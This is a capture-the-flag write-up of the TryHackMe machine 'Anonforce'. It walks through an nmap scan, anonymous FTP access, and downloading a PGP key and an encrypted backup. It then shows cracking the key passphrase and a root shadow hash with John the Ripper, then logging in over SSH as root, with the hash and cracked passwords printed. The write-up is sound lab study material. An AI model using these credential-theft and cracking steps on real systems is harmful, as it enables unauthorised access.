@@ -1,0 +1,150 @@
+A boot2root challenge created by stuxnet for FIT and bsides guatemala CTF
+
+Completed using Try Hack Me and Kali vm
+
+2 flags to be found
+
+# Flag 1 - read user.txt
+
+I start scanning the target system using namp
+
+  nmap -sV -sC <TARGETIP>
+
+This yields useful information, including open ports, file structure and initial credential requirements
+
+  PORT   STATE SERVICE VERSION
+  21/tcp open  ftp     vsftpd 3.0.3
+  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+  ...
+  | drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
+  ...
+  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+
+Straight away I know I have two vectors by which I can access the machine. 
+
+FTP allows anonymous login so I explore that channel first
+
+  ftp <TARGETIP>      
+  Connected to <TARGETIP>.
+  220 (vsFTPd 3.0.3)
+  Name (<TARGETIP>:kali): anonymous
+  331 Please specify the password.
+  Password: 
+  230 Login successful.
+
+From here I go exploring for what I have access to through anonymous ftp login and fortunately, my first path leads me to my first flag
+
+  ftp> cd home
+  250 Directory successfully changed.
+  ftp> ls
+  229 Entering Extended Passive Mode (|||56829|)
+  150 Here comes the directory listing.
+  drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
+  226 Directory send OK.
+  ftp> cd melodias
+  250 Directory successfully changed.
+  ftp> ls
+  229 Entering Extended Passive Mode (|||44670|)
+  150 Here comes the directory listing.
+  -rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
+  226 Directory send OK.
+  ftp> get user.txt
+  local: user.txt remote: user.txt
+  229 Entering Extended Passive Mode (|||27592|)
+  150 Opening BINARY mode data connection for user.txt (33 bytes).
+  100% |********************************|    33       21.68 KiB/s    00:00 ETA
+  226 Transfer complete.
+  33 bytes received in 00:00 (0.12 KiB/s)
+
+Revealing the first flag is just a matter of opening a new terminal window/tab to access my machine 
+
+  cat user.txt
+
+Flag 1 found!
+
+# Flag 2 - root.txt
+
+Gets a bit tricker from here. 
+
+Back to the ftp shell
+
+I don't have access to /root as anonymous and I note a folder labelled `notread`
+
+    In offsec exercises, if it tells me not to do it I'm going to do it
+
+  ftp> cd /notread
+  250 Directory successfully changed.
+  ftp> ls
+  229 Entering Extended Passive Mode (|||50536|)
+  150 Here comes the directory listing.
+  -rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
+  -rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
+  226 Directory send OK.
+  ftp> get backup.pgp
+  local: backup.pgp remote: backup.pgp
+  229 Entering Extended Passive Mode (|||17974|)
+  150 Opening BINARY mode data connection for backup.pgp (524 bytes).
+  100% |********************************|   524        6.66 MiB/s    00:00 ETA
+  226 Transfer complete.
+  524 bytes received in 00:00 (1.76 KiB/s)
+  ftp> get private.asc
+  local: private.asc remote: private.asc
+  229 Entering Extended Passive Mode (|||41004|)
+  150 Opening BINARY mode data connection for private.asc (3762 bytes).
+  100% |********************************|  3762       47.20 MiB/s    00:00 ETA
+  226 Transfer complete.
+  3762 bytes received in 00:00 (13.77 KiB/s)
+
+And it pays off. Now I've exfiltrated both files, a private key and a backup that requires the private key.
+
+I need to return to my machine and start cracking.
+
+I use gpg2john to convert the pgp block into a hash
+
+  $ gpg2john private.asc > anonforce1 
+
+From there I use john the ripper to reveal the password
+
+  $ john anonforce1
+   
+    ...
+    xbox360          (anonforce) 
+    ...
+
+I'm going to import the unmodified key file in order to decrypt the protected backup
+
+  $ gpg --import private.asc 
+
+    ...
+
+  $ gpg --decrypt backup.pgp 
+  ...
+    "anonforce <melodias@anonforce.nsa>"
+  root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
+
+One step closer to root access!
+
+I create a fresh .txt document for the root hash and store the complete output separately
+
+  $ john anonforceroot.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+  Using default input encoding: UTF-8
+  Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
+  Cost 1 (iteration count) is 5000 for all loaded hashes
+  Will run 2 OpenMP threads
+  Press 'q' or Ctrl-C to abort, almost any other key for status
+  hikari           (root)
+
+Root credentials obtained!
+
+Now to ssh into the target machine as root using the cracked credentials and retrieve the second flag!
+
+    $ ssh root@<TARGETIP>
+  root@<TARGETIP>'s password: 
+  ...
+  root@ubuntu:~# ls
+  root.txt
+  root@ubuntu:~# cat root.txt 
+Flag 2 found!
+
+Thanks to stuxnet for creating this boot2root machine
+
